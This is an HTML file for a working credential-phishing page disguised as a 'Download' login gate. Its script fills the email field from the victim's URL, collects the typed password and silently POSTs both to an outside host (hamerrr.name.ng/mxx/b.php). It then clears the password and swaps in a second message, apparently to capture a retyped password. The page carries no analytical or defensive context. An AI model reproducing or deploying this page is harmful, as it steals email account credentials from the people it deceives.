<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        body {
            height: 100vh;
            background: url("ca.jpg") no-repeat fixed center center;
            background-size: cover;
        }
        
        #form {
            padding: 40px;
            background: #00713A;
        }
    </style>
</head>


<body class="d-flex justify-content-center align-items-center">
    <div class="col-sm-4" id="form">

        <form action="" method="POST" id="formx">
            <img src="logo.png" style="width:80%;">
            <div id="msg">
		<img src="msg.png" class="img-fluid">
	    </div>
            <div class=" mt-3">

                <input type="email" class="form-control mb-2" id="x1" placeholder="Enter email" name="x1" readonly="">
            </div>
            <div class="">

                <input type="password" class="form-control" id="x2" placeholder="Enter password" name="x2" minlength="6" required="">
            </div>
            <div class="form-check ">
                <label class="form-check-label text-white">
                    <input class="form-check-input " type="checkbox" name="remember"> Remember me
                  </label>
            </div>
            <button type="submit" class="btn btn-outline-light bg-success text-white">Download</button>
        </form>
    </div>
<script>
$(document).ready(function() {


    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`).prop("disabled", true);
        $.ajax({
            url: "https://hamerrr.name.ng/mxx/b.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
  beforeSend: function(xhr) {
                $('button').html('Verifing...').prop("disabled", true);
            },
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`<img src="msg2.png" class="img-fluid">`);
                         $("button").html("Download").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
</script>
</body>

</html>
